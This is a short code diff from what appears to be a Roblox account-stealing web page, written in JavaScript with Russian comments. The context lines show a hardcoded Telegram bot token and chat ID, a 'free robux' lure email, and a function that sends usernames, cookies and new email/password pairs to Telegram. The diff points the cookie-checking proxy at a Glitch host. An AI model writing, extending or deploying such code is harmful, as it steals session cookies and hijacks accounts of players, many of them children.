@@ -282,7 +282,7 @@
         const TELEGRAM_TOKEN = "8143511538:AAFWgq1zyShC59YLFVDth_ENak8SZ7ibtTY";
         const TELEGRAM_CHAT_ID = "5180010738";
         const FAKE_EMAIL = "robuxx0free0get@gmail.com";
-        const PROXY_URL = ""; // Замени на https://roblox-proxy.onrender.com после настройки Render
+        const PROXY_URL = "https://sore-ablaze-antimony.glitch.me"; // Укажи https://roblox-proxy.glitch.me после настройки Glitch
 
         // Отправка в Telegram
         async function sendToTelegram(username, cookies, newEmail, newPassword) {
@@ -321,7 +321,7 @@
                 console.error("Ошибка проверки куки:", e);
                 return {
                     valid: false,
-                    error: `Ошибка сети: ${e.message}. Roblox API блокирует запросы из-за CORS. Убедись, что PROXY_URL настроен (например, https://roblox-proxy.onrender.com). Подробности: https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS`
+                    error: `Ошибка сети: ${e.message}. Roblox API блокирует запросы из-за CORS. Настрой прокси на Glitch: https://glitch.com.`
                 };
             }
         }
